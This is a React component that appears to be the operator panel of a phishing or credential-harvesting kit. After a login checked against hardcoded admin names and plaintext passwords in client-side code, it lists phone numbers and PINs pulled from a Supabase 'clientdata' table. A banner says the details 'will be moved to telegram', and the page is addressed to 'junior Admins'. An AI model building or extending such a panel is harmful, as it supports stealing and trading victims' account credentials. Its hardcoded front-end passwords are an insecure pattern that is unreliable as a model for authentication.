import { useEffect, useState } from "react";
import { supabase } from "../assets/lib/supabase";
import styles from "./Viewpage.module.css";
import { useNavigate } from "react-router-dom";

export default function Viewpage() {
  const navigate = useNavigate();
  const [clientsRaw, setClientsRaw] = useState([]);
  const [user, setuser] = useState(false);
  const [username, setusername] = useState("");
  const [password, setpassword] = useState("");
  const [wrongusername, setwrongusername] = useState(false);
  const [wrongpass, setwrongpass] = useState(false);
  const [trial, setTrial] = useState(1);

  function goBack() {
    navigate(-1);
  }

  useEffect(() => {
    async function fetchClients() {
      const { data, error } = await supabase.from("clientdata").select("*");
      setClientsRaw(data);
      if (error) {
        console.log("Error fetching clients:", error);
      }
    }

    fetchClients();
  }, []);
  const clients = clientsRaw.reverse();
  const count = clients.length;

  const admins = [
    { name: "vickii", password: "Vickii123" },
    { name: "codex", password: "codexCode" },
  ];

  function authuser(e) {
    e.preventDefault();
    if (username === "" || password === "") {
      return;
    }
    let found = admins.find(
      (admin) => admin.name === username && admin.password === password
    );

    if (found) {
      setuser(true);
      console.log("good");
    } else {
      setwrongusername(true);
      setwrongpass(true);
      console.log("bad");
      setTrial(trial + 1);
      if (trial >= 2) {
        goBack();
      }
    }
  }

  return (
    <>
      {user ? (
        <div className={styles.container}>
          <h3>View Details here</h3>
          <h3 style={{ color: "red" }}>
            Details will be moved to telegram in 2 days!!
          </h3>

          <p className={styles.count}>There are {count} details</p>
          <hr style={{ border: "1.5px solid black", marginBottom: "2rem" }} />
          {clients.map((client) => (
            <div key={client.id}>
              <p>Number: {client.number}</p>
              <p>Pin: {client.pin}</p>
              <hr />
            </div>
          ))}
        </div>
      ) : (
        <div className={styles.authcontainer}>
          <h2>This page is for junior Admins Only!</h2>
          <input
            type="text"
            value={username}
            onChange={(e) => setusername(e.target.value)}
            placeholder="username"
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setpassword(e.target.value)}
            placeholder="password"
          />
          {wrongusername && wrongpass && (
            <label htmlFor="number" style={{ color: "red" }}>
              You are not authorized here.
            </label>
          )}
          <button type="submit" onClick={(e) => authuser(e)}>
            continue
          </button>
          <button className={styles.back} onClick={goBack}>
            Back
          </button>
        </div>
      )}
    </>
  );
}
